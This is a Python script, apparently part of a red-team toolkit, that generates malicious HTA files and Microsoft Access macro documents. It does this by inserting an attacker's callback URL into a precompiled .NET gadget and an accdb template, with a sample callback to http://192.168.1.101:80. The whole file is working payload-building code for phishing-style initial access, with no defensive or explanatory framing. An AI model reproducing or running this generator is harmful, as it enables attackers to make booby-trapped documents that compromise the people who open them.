import base64
import codecs

replaceString = b"superlongstringthatwillbepaddedafteryoureplaceitwithyoururlcallbackbecausethegadgetisencodedasacompiledmemorystreamandimsureyoudontwanttohavetorunthisserveronwindowsordealwithinstallingdotnetonlinux"
paddingCharacer = "!"

def pad_replacement(url):
	urlLength = len(url)
	replaceStringLen = len(replaceString)
	if urlLength > replaceStringLen:
		print("Error: The URL is too long for our replacement string. The maximum URL length for Access payload generation is: " + str(replaceStringLen))
		url = ""
		return url
	else:
		url = url.rjust(replaceStringLen, "!")
		return url

# The string to find and replace, when compiled to MSIL, is stored with a null byte between each character.
# This function takes our replace string to search for and pads it with \x00 between each
# It is also used to add \x00 inbetween each character of our padded URL
def pad_null_bytes(bytestring):
	nullpaddedstr = b''
	nullstr = b'\x00'
	for i in bytestring:
		nullpaddedstr = nullpaddedstr + i.to_bytes(1,'little') + nullstr
	return nullpaddedstr


def decode_and_replace_gadget(gadget_template_location, url, output_file, compiled_gadget_location):
	paddedUrl = pad_replacement(url)
	nullpaddedReplaceStr = pad_null_bytes(replaceString)
	#print("Null Padded to Replace: \n\n", nullpaddedReplaceStr)
	nullpaddedPaddedUrl = pad_null_bytes(bytes(paddedUrl, encoding='utf8'))

	if paddedUrl:
		#Edit the gadget
		f=open(compiled_gadget_location, "rb")
		s=f.read()
		f.close()
		s=s.replace(nullpaddedReplaceStr, nullpaddedPaddedUrl)
		encodedOutput = base64.b64encode(s)

		#Open the HTA template, read it in, and replace our gadget
		hta=open(gadget_template_location, "r")
		content=hta.read()
		hta.close()
		content=content.replace("REPLACEMODIFIEDGADGETHERE", encodedOutput.decode("utf-8"))

		#Open the output file and write content to it
		outfile=open(output_file, "w")
		outfile.write(content)
		outfile.close()

	else:
		print("Failed to generate Access Macro.")

def open_and_write_gadget(access_file_location, url, output_file):
	paddedUrl = pad_replacement(url)
	if paddedUrl:
		f=open(access_file_location, "rb")
		s=f.read()
		f.close()
		s=s.replace(replaceString, bytes(paddedUrl, encoding='utf8'))
		print("Writing Access Macro (accdb) to file: ", output_file)
		new=open(output_file, "wb")
		new.write(s)
		new.close()
	else:
		print("Failed to generate Access Macro.")

if __name__ == "__main__":
	decode_and_replace_gadget("./gadget-jscript-template.hta","http://192.168.1.101:80","./test-gadget-out.hta","./decoded-gadget.exe")
